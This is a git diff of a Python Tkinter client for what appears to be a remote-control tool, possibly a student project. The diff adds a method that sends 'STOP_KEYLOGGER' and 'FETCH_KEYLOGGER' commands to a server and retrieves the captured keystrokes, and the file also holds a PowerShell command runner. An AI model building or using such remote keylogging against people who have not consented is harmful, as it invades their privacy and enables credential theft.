@@ -5,6 +5,8 @@ import subprocess
 from tkinter import messagebox, ttk
 import tkinter as tk
 
+import keyboard
+
 class cl_model:
     def __init__(self, view):
         self.client_socket = None
@@ -13,8 +15,8 @@ class cl_model:
         self.keys_buffer = []
         
     def connect_to_server(self, server_ip, server_port):
-        if self.connected:
-            raise ConnectionError("Đã kết nối đến server!")        
+        # if self.connected:
+        #     raise ConnectionError("Đã kết nối đến server!")        
         try:
             self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.client_socket.connect((server_ip, server_port))
@@ -31,14 +33,24 @@ class cl_model:
         
     def send_command(self, client_socket, command):
         client_socket.sendall(command.encode())  # Mã hóa lệnh và gửi
+        
+    def send_command_recieve_keylogger(self, command):
+        try:
+            self.client_socket.sendall(command.encode())
+            if command in ["STOP_KEYLOGGER", "FETCH_KEYLOGGER"]:
+                data = self.client_socket.recv(65535).decode()
+                return data.split(" ") if data else []
+            return []
+        except Exception as e:
+            print(f"Error sending command: {e}")
+            return []
 
     def receive_response(self, client_socket, buffer_size=65535):
-        response = client_socket.recv(buffer_size).decode() # Nhận và giải mã phản hồi
-        return response
+        return client_socket.recv(buffer_size).decode() # Nhận và giải mã phản hồi
+        
     
     def receive_response_utf8(self, client_socket, buffer_size=65535):
-        response = client_socket.recv(buffer_size).decode("utf-8")  # Nhận và giải mã phản hồi
-        return response
+        return client_socket.recv(buffer_size).decode("utf-8")  # Nhận và giải mã phản hồi
     
     def show_message(self, message):
         messagebox.showinfo("Thông báo", message)
@@ -130,7 +142,19 @@ class cl_model:
             return None, None
         except FileNotFoundError:
             print("File cấu hình không tồn tại.")
+            return None, None    
+        
+    def read_config_server(self, CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, "r") as file:
+                config = json.load(file)
+            return config.get("server_ip"), config.get("server_port")
+        except json.JSONDecodeError:
+            print("File cấu hình không hợp lệ. Vui lòng kiểm tra nội dung file.")
             return None, None
+        except FileNotFoundError:
+            print("File cấu hình không tồn tại.")
+            return None, None 
     
             
 #Thiet ke giao dien
@@ -297,12 +321,3 @@ def run_powershell_command(command):
         return result.stdout
     except subprocess.CalledProcessError as e:
         return e.stderr
-
-def add_to_keys_buffer(self, keys):
-    self.keys_buffer.extend(keys)
-
-def clear_keys_buffer(self):
-    self.keys_buffer = []
-
-def get_keys_buffer(self):
-    return self.keys_buffer
